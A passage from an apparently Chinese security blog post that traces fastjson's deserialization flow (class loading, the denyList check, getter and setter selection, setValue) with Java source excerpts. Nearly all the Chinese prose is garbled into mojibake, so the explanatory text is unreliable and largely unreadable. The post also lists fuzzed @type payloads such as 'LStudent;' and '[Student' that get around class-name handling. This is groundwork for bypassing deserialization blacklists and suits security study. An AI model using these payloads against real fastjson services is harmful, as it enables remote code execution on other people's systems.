alt><br>é¦–å…ˆä¼šåœ¨mappingsä¸­å»æ‰¾æ˜¯å¦å­˜åœ¨è¿™äº›ç±»ï¼Œå¦‚æœä¸å­˜åœ¨å°±è·³åˆ°<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = classLoader.loadClass(className);</span><br><span class="line">    mappings.put(className, clazz);</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å»åŠ¨æ€åŠ è½½ç±»ï¼Œå¹¶ä¸”å°†ç±»å’Œç±»åæ·»åŠ åˆ°mappingsä¸­ï¼Œç„¶åè¿”å›æ­¤ç±»ï¼Œè¿™é‡Œçš„mappingså…¶å®æ˜¯ä¸€ä¸ªç¼“å­˜ï¼Œä¸€èˆ¬æ˜¯javaçš„åŸç”Ÿç±»ï¼Œå…³äºåŠ¨æ€åŠ è½½ç±»åˆ°åº•çŸ¥è¯†å¯ä»¥è‡ªå·±ç™¾åº¦æœç´¢ä¸€ä¸‹ï¼Œè¿™é‡Œä¸ç»†è¯´</p><blockquote><p>å°æ’æ›²<br>è¿™é‡Œæˆ‘æ³¨æ„åˆ°äº†ä¸­é—´ä¸¤ä¸ªifè¯­å¥<br>ç¬¬ä¸€ä¸ªï¼šå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯â€œ[â€ï¼Œé‚£ä¹ˆå°±å°†ä»–å»æ‰ï¼Œåœ¨è¿›è¡ŒloadClass<br>ç¬¬äºŒä¸ªï¼šå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯â€œLâ€,ä¸”ç»“å°¾æ˜¯â€œ;â€ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯å»æ‰ä»¥åè°ƒç”¨loadClass<br>è¿™é‡Œæˆ‘fuzzäº†ä¸€ä¸‹<br><code>&#123;&quot;@type&quot;:&quot;[Student&quot;&#125;</code><br>ä¸­æ‹¬å·åŠ åœ¨æœ€å‰é¢ä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä½†æ˜¯æ ¹æ®ä»–çš„æŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘æœ€åæ•´ç†äº†ä¸€ä¸ªæ–°çš„å¯ä»¥åˆ©ç”¨çš„ï¼Œåœ¨ä¸‹ä¸€ç¯‡æˆ‘ä¼šè¯´ä¸€ä¸‹æˆ‘æ˜¯å¦‚ä½•æ‰¾å‡ºè¿™æ ·çš„payloadçš„<code>&#123;&quot;@type&quot;:&quot;[Student&quot;[&#123;,&quot;age&quot;:12,&quot;name&quot;:&quot;kaikaix&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LStudent;&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LLStudent;;&quot;&#125;</code><br>è¿™æ ·å°±ä¸ä¼šæŠ¥é”™ï¼Œå¯ä»¥ç»§ç»­æ¥ä¸‹æ¥çš„æ“ä½œï¼Œè°ƒç”¨æ— å‚æ„é€ å’Œsetæ–¹æ³•</p></blockquote><h3 id="No6-parseObject-gt-getDeserializer"><a href="#No6-parseObject-gt-getDeserializer" class="headerlink" title="No6 parseObject()-&gt;getDeserializer()"></a>No6 parseObject()-&gt;getDeserializer()</h3><p>æ¥ä¸‹æ¥åˆ°äº†<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/14.jpg" alt><br>æˆ‘ä»¬è¿›å…¥åˆ°getDeserializerä¸­ï¼Œä¸­é—´ä¼šåˆ°äº†ä¸€ä¸ªdenyListçš„ä¸€ä¸ªå¾ªç¯<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/15.jpg" alt><br>è¿™é‡Œå‰é¢çš„replaceæ˜¯å°†â€œ$â€æ›¿æ¢ä¸ºâ€œ.â€</p><blockquote><p>å¦‚æœAç±»ä¸­æœ‰ä¸ªå†…éƒ¨ç±»B<br>åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç”ŸæˆA.classå’ŒA$B.class</p></blockquote><p>é‚£ä¹ˆè¿™ä¸€æ®µä»£ç å°±æ˜¯ç”¨æ¥æ£€æŸ¥ä½ çš„ç±»åæ˜¯å¦åœ¨é»‘åå•ä¸­ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªç‰ˆæœ¬çš„fastjsonï¼Œé»‘åå•åªæœ‰ä¸¤ä¸ªThreadç±»</p><h3 id="No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer"><a href="#No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer" class="headerlink" title="No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()"></a>No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()</h3><p>è¿‡äº†é»‘åå•ä»¥åï¼Œå°±ä¼šä¸ä¸€äº›fastjsonæ”¯æŒçš„ç±»è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ°äº†å°±ä¼šè¿”å›ç›¸åº”çš„Deserializer<br>å¦‚æœåŒ¹é…ä¸åˆ°å°±åˆ°ä¸‹å›¾ä»£ç ä¸­çš„åœ°æ–¹<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/16.jpg" alt><br>è¿›å…¥åˆ°è¿™ä¸ªå‡½æ•°ä¸­ä¼šå…ˆè·å–ä¸€ä¸‹clazzçš„çˆ¶ç±»ï¼Œç„¶åå°±åˆ°äº†è¿™é‡Œ<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/17.jpg" alt><br>ä¸»è¦å°±æ˜¯é€šè¿‡è·å–æ„é€ å‡½æ•°å’Œä¸€äº›æˆå‘˜æ–¹æ³•æ„å»ºäº†ä¸€ä¸ªJavaBeanInfoç±»ï¼Œå¹¶è¿”å›<br>è¿™é‡Œéœ€è¦æçš„æ˜¯ï¼Œä»–åœ¨å†…éƒ¨ä¼šåˆ¤æ–­ä¸€ä¸ªæˆå‘˜æ–¹æ³•æ˜¯å¦æ˜¯setXxxæ–¹æ³•æˆ–getXxxæ–¹æ³•ï¼Œå¦‚æœç¬¦åˆä¸€äº›æ¡ä»¶å°±ä¼šæ·»åŠ å…¥fieldListè¿™ä¸ªæ•°ç»„ä¸­<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//setçš„</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">(method.getReturnType().equals(Void.TYPE) || </span><br><span class="line">method.getReturnType().equals(method.getDeclaringClass())))&#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">        add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">                propertyName, </span><br><span class="line">                method, </span><br><span class="line">                field, </span><br><span class="line">                clazz, </span><br><span class="line">                type, </span><br><span class="line">                ordinal, </span><br><span class="line">                serialzeFeatures, </span><br><span class="line">                parserFeatures, </span><br><span class="line">                annotation, </span><br><span class="line">                fieldAnnotation, </span><br><span class="line">                (String)<span class="literal">null</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getçš„</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; </span><br><span class="line">Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; </span><br><span class="line">method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; </span><br><span class="line">(Collection.class.isAssignableFrom(method.getReturnType()) ||</span><br><span class="line">Map.class.isAssignableFrom(method.getReturnType()) || </span><br><span class="line">AtomicBoolean.class == method.getReturnType() || </span><br><span class="line">AtomicInteger.class == method.getReturnType() || </span><br><span class="line">AtomicLong.class == method.getReturnType()))&#123;</span><br><span class="line">    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">            propertyName, </span><br><span class="line">            method, </span><br><span class="line">            (Field)<span class="literal">null</span>, </span><br><span class="line">            clazz, </span><br><span class="line">            type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">            annotation, </span><br><span class="line">            (JSONField)<span class="literal">null</span>, </span><br><span class="line">            (String)<span class="literal">null</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœè¦æŠŠsetæ–¹æ³•æ·»åŠ è¿›å…¥fieldListï¼Œé‚£ä¹ˆæ­¤æ–¹æ³•éœ€è¦æ»¡è¶³çš„å‡ ä¸ªç‚¹</p><ul><li>è¿”å›å€¼ä¸ºvoidç±»å‹æˆ–è€…è¿”å›å€¼çš„ç±»å‹æ˜¯å½“å‰ç±»</li><li>ä¸èƒ½æ˜¯é™æ€æ–¹æ³•</li><li>å¼€å¤´æ˜¯set<br>æˆ‘è¿™é‡Œç”¨ä¸‹é¢ä¸¤å—ä»£ç æ¥è§£é‡Šä¸€ä¸‹ç¬¬ä¸€ç‚¹<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Student <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>getçš„æ»¡è¶³æ¡ä»¶</p><ul><li>Methodä¸æ˜¯é™æ€çš„</li><li>Methodæ— å‚æ•°</li><li>Methodçš„è¿”å›ç±»å‹è¦ç»§æ‰¿è‡ªä¸Šé¢æ‰€å†™çš„ç±»</li></ul><p>æ¥ä¸‹æ¥è§£é‡Šä¸€ä¸‹FieldInfoçš„å‡ ä¸ªé‡è¦å‚æ•°</p><ul><li>propertyNameï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯getXxxæˆ–setXxxçš„Xxxï¼Œä¹Ÿå°±æ˜¯ç›¸åº”æ–¹æ³•çš„å˜é‡åç§°ï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹</li><li>methodï¼Œå°±æ˜¯ä¸€ä¸ªMethodç±»ï¼Œæ˜¯getXxxæˆ–setXxxçš„åå°„</li></ul><p>è¿™ä¸ªfieldListåœ¨åé¢è°ƒç”¨æ–¹æ³•çš„æ—¶å€™æœ‰é‡è¦ä½œç”¨<br>å½“æŠŠæ‰€æœ‰ç›¸åº”çš„æ–¹æ³•åŠ åˆ°fieldListä¸­åï¼Œå°±åˆ°äº†è¿™ä¸ªå‡½æ•°çš„æœ€åä¸€æ­¥<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/18.jpg" alt><br><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);</code><br>ä¼šæŠŠfieldListå’Œè¯¥classç±»çš„åå°„å°è£…åˆ°JavaBeanInfoé‡Œé¢<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/19.jpg" alt><br>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹è¿™æ®µä»£ç ï¼Œä»–ä¼šæŠŠä¼ å…¥çš„fieldListè¿›è¡Œä¸€ä¸ªæ’åºï¼Œç„¶åèµ‹å€¼ç»™sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/20.jpg" alt><br>æ¥ä¸‹æ¥èµ°åˆ°è¿™ï¼Œé‡æ–°newäº†ä¸€ä¸ªJavaBeanDeserializerå¯¹è±¡ï¼Œä¸è¿‡å’Œä¸Šé¢çš„æ­¥éª¤ç›¸åŒï¼Œç„¶åè¿”å›</p><h3 id="No8-parseObject-gt-deserializer-deserialze"><a href="#No8-parseObject-gt-deserializer-deserialze" class="headerlink" title="No8 parseObject()-&gt;deserializer.deserialze()"></a>No8 parseObject()-&gt;deserializer.deserialze()</h3><p>è¿”å›ä»¥åæœ€åèµ‹å€¼ç»™äº†deserializerï¼Œä¹Ÿå°±æ˜¯No6<br>æˆ‘ä»¬çœ‹åˆ°deserializeræœ‰ä¸€ä¸ªsortedFieldDesrializersï¼Œä¹Ÿå°±æ˜¯No7ä¸­çš„sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/21.jpg" alt><br>æ¥ä¸‹æ¥ç›´æ¥çœ‹åˆ°parseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/22.jpg" alt><br>è¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯ç”¨æ¥è°ƒç”¨getXxxæˆ–è€…setXxxï¼Œå¯¹Xxxè¿›è¡Œä¸€äº›èµ‹å€¼æ“ä½œ<br>è¿›å…¥æ­¤å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å¼€å¤´æœ‰ä¸€ä¸ªsmartMatch<br>èŠ‚é€‰ä¸€æ®µé‡è¦ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldDeserializer <span class="title function_">smartMatch</span><span class="params">(String key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (snakeOrkebab) &#123;</span><br><span class="line">        fieldDeserializer = getFieldDeserializer(key2);</span><br><span class="line">        <span class="keyword">if</span> (fieldDeserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (FieldDeserializer fieldDeser : sortedFieldDeserializers) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldDeser.fieldInfo.name.equalsIgnoreCase(key2)) &#123;</span><br><span class="line">                    fieldDeserializer = fieldDeser;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>key2å°±æ˜¯getXxxæˆ–è€…setXxxå¯¹åº”çš„Xxx<br>ä¸Šé¢çš„ä»£ç å°±æ˜¯ä»sortedFieldDeserializersæ•°ç»„ä¸­ï¼ˆNo7ä¸­çš„fieldListï¼‰å¯»æ‰¾æ˜¯å¦æœ‰å¯ä»¥åŒ¹é…å¾—åˆ°çš„ï¼ŒåŒ¹é…å¾—åˆ°å°±è¿”å›FieldDeserializerï¼ŒåŒ¹é…ä¸åˆ°å°±è¿”å›null<br>å¦‚æœæ˜¯nullå°±ä¼šæ‰§è¡Œçš„ä¸‹é¢çš„ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">deserOrField</span> <span class="operator">=</span> extraFieldDeserializers.get(key);</span><br><span class="line"><span class="keyword">if</span> (deserOrField != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (deserOrField <span class="keyword">instanceof</span> FieldDeserializer) &#123;</span><br><span class="line">        fieldDeserializer = ((FieldDeserializer) deserOrField);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> (Field) deserOrField;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(key, field.getDeclaringClass(), field.getType(), field.getGenericType(), field, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        fieldDeserializer = <span class="keyword">new</span> <span class="title class_">DefaultFieldDeserializer</span>(parser.getConfig(), clazz, fieldInfo);</span><br><span class="line">        extraFieldDeserializers.put(key, fieldDeserializer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä»extraFieldDeserializersä¸­getç›¸åº”çš„field<br>extraFieldDeserializersæ˜¯ä¸€ä¸ªHashMapï¼Œé”®æ˜¯æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œå€¼æ˜¯æˆå‘˜å˜é‡å¯¹åº”çš„fieldï¼Œæœ€åfieldDeserializerå°±æ˜¯å¯¹ç›¸åº”fieldè¿›è¡Œä¸€æ¬¡å°è£…<br>æœ€åç”¨è¿™ä¸ªå°è£…å¥½çš„ç±»è¿›è¡ŒparseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/24.jpg" alt></p><h3 id="No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField"><a href="#No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField" class="headerlink" title="No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()"></a>No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()</h3><p>é¦–å…ˆå¯¹valueè¿›è¡Œè§£æï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ˜¯byteç±»å‹ï¼Œé‚£ä¹ˆå°±ä¼šå¯¹å…¶è¿›è¡Œä¸€ä¸ªbase64è§£ç <br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/23.jpg" alt><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/25.jpg" alt><br>æ‰€ä»¥å¦‚æœè¦ç»™byteç±»å‹è¿›è¡Œååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±éœ€è¦å…ˆè¿›è¡Œä¸€æ¬¡base64åŠ å¯†<br>èµ‹å€¼å®Œä»¥åå°±è¿›å…¥äº†setValueæ“ä½œï¼Œç»™ååºåˆ—åŒ–çš„å¯¹è±¡è®¾ç½®å€¼<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/26.jpg" alt><br>setValueçš„å®ç°<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span> <span class="comment">//</span></span><br><span class="line">        &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> fieldInfo.method;</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                method.invoke(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> fieldInfo.field;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                    field.set(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;set property error, &quot;</span> + fieldInfo.name, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¤§è‡´çš„æ€è·¯å°±æ˜¯çœ‹ä¹‹å‰çš„fieldInfoä¸­æ˜¯å¦æœ‰methodï¼Œåœ¨No7ä¸­æœ‰ç›¸å…³çš„æ“ä½œï¼Œå¦‚æœæœ‰å°±ä¼šå»invokeã€‚<br>æ‰€ä»¥å¦‚æœæœ‰ç›¸å…³çš„getXxxæ–¹æ³•æˆ–è€…setXxxæƒ³å»è°ƒç”¨ï¼Œé‚£åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¿…é¡»æŠŠç›¸å…³çš„Xxxå˜é‡åŠ åˆ°jsonæ•°æ®ä¸­ï¼Œè¿™æ ·æ‰ä¼šæœ‰ç›¸åº”çš„å˜é‡å°è£…åˆ°fieldDeserializerï¼ˆNo8æ­¥éª¤ï¼‰ï¼Œä¹‹åæ‰ä¼šåœ¨setValueçš„æ—¶å€™å»è°ƒç”¨å¯¹åº”çš„getXxxæˆ–è€…setXxxæ–¹æ³•</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" 